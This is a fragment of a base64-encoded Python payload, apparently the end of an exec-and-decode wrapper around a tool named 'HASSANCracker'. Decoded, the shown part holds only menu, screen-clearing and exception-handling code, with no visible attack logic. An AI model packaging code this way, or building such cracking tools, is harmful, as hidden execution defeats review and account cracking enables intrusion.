ci5XfSIpCiAgICAgICAgc2VsZi5vbGRfbWVudSgpCgoKICAgICAgICBkZWYgY2xlYXIoKToKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQocHJvX2Jhbm5lcigpKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHRyeToKICAgICAgICBjcmFja2VyID0gSEFTU0FOQ3JhY2tlcigpCiAgICAgICAgY3JhY2tlci5vbGRfbWVudSgpCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoJ1xuXHgxYls5MTsxbSAgIOKepCBTdG9wcGVkXHgxYls5NzsxbScpCiAgICAgICAgc3lzLmV4aXQoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYnXG5ceDFiWzkxOzFtICAg4p6kIEVycm9yOiB7c3RyKGUpfVx4MWJbOTc7MW0nKQogICAgICAgIAogICAgICAgIHN5cy5leGl0KCkgCiAgICAgICA='))